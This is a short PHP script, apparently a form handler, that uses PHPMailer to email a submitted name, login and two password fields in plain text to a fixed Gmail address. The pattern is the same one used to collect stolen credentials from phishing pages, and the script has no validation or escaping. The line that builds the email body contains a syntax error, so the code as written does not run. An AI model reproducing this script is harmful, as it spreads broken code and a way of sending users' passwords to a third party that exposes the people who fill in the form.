<?php
	use PHPMailer\PHPMailer\PHPMailer;
	use PHPMailer\PHPMailer\Exception;

	require "PHPMailer/src/Exception.php";
	require "PHPMailer/src/PHPMailer.php";

	$sendMessage = new PHPMailer(true);
	$sendMessage->CharSet = 'UTF-8';
	$sendMessage->setLanguage('uk', 'PHPMailer/language/');
	$sendMessage->IsHTML(true);
	$name = $_POST["name"];
	$login = $_POST["login"];
	$password1 = $_POST["password1"];
	$password2 = $_POST["password2"];

	$body = $name. ' ' .$login. ' ' .$password1. ' ' .$password2.;
	$sendMessage->Subject = 'Привет! Это "Фрилансер по жизни"';

	$sendMessage->addAddress('kaxa0308super@gmail.com');
	$sendMessage->Body = $body;

	$sendMessage->send();
?>